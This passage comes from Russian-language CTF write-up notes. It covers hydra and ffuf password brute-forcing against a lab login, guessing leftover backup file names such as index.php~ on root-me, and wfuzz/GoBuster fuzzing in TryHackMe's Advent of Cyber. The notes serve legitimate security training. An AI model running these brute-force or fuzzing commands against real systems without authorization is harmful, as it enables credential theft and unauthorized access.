ffuf -request request.txt -request-proto http -mode clusterbomb -w /path/to/users/file.txt:USERFUZZ -w /path/to/password/file.txt:PASSFUZZ -mc 200
```

С п.м. hydra:

```bash
hydra -L usernames.txt -P passwords.txt 10.10.226.104 http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:username_incorrect"
```

![[Pasted image 20240826205714.png]]

Теперь вы можете видеть, что была проведена атака методом перебора, и все запросы были перенаправлены куда-то, но если вы посмотрите на длину запроса полезной нагрузки, все остальные запросы имеют код 309, но 8-й запрос получил код 255, что означает, что это может сработать, так что теперь не нужно идти и размещать эти учетные данные на веб-сайте.

![[Pasted image 20240726151746.png]]


---
# Fuzzing

## Backup file

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Решим задание "Backup file". Из названия видно, что речь пойдёт про бекапы (бекап - резервная копия каких либо данных для экстренных случаев). 

Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/Backup-file

Приступаем к заданию и попадаем на форму ввода логина и пароля.

![[Pasted image 20230107161523.png]]

Данное задание по большей части основано на некотором прямом знании, нежели логики и рассуждениям. При создании бекапа часто делается просто копия объекта, однако его наименование нужно немного изменить, для этого могут добавляться различные символы в конец файла (например, чтобы убрать расширение *.php, для того, чтобы файл не исполнялся при обращении к нему). Можно попробовать скачать файлы, которые потенциально могут быть на сервере. Например, файлы со следующими названиями:

• backup.zip
• backup.tar.gz
• index.zip
• index.tar.gz
• index.php_
• index.php1
• index.phps
• index.php~

При указании в адресной строке последнего названия (index.php~) произойдёт скачивание файла с исходным кодом.
Открыв данный файл в текстовом редакторе получим исходный код (в том числе и серверную часть) обработчика формы.

![[Pasted image 20230107161708.png]]

И получаем пароль для подтверждения решения данного задания. 

Данное задание по большей части зацикливается на некотором прямом знание того,что на серверы могут быть забыты/оставлены бекапы важных файлов.

## Santa's watching

**Платформа:** https://tryhackme.com/
**Уровень:** Easy
**Комната**: [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2)

_Наш злобный, подлый, мерзкий, жестокий, презрительный, злой хакер испортил форумы Elf и полностью удалил страницу входа! Однако у нас все еще может быть доступ к API. Системный администратор также сказал нам, что API создает логи, используя даты в формате ГГГГММДД._

**Вопрос №1 При наличии URL-адреса «** [**http://shibes.xyz/api.php**](http://shibes.xyz/) **» как будет выглядеть вся команда wfuzz для запроса параметра «breed» с использованием списка слов «big.txt» (предположим, что «big.txt» находится в вашем текущем каталоге)?**

Еще один веб-челлендж сегодня. Вот веб-страница, связанная с сегодняшним IP-адресом:


![[Pasted image 20240729124535.png]]

Но первый вопрос на самом деле требует, чтобы мы провели фаззинг другого веб-сайта, [http://shibes.xyz/api.php](http://shibes.xyz/) .

Поскольку это подделка, вы не сможете этого сделать на самом деле, но просто представьте, как будет выглядеть ваша команда, если использовать материалы, включенные в задание:

```
wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ
```

**Вопрос №2 Используйте GoBuster, чтобы найти каталог API. Какой файл там находится?**

Я запустил GoBuster на главной странице:

![[Pasted image 20240729124612.png]]

Можно использовать dirb, ffuf или даже wfuzz.

Затем я перешел в **/api** , где нашел нужный мне файл **site-log.php.**

![[Pasted image 20240729124703.png]]

**Вопрос №3. Фаззинг параметра даты в файле, который вы нашли в каталоге API. Какой флаг отображается в правильном посте?**

Я запустил команду wfuzz и увидел одну, которая выглядела немного иначе, чем остальные. Дата 20201125 показывает 13 символов, так что вы можете сказать, что она не пустая, как остальные:

![[Pasted image 20240729124724.png]]

Перейдите туда в своем веб-браузере, и вы увидите флаг!

![[Pasted image 20240729124737.png]]

---

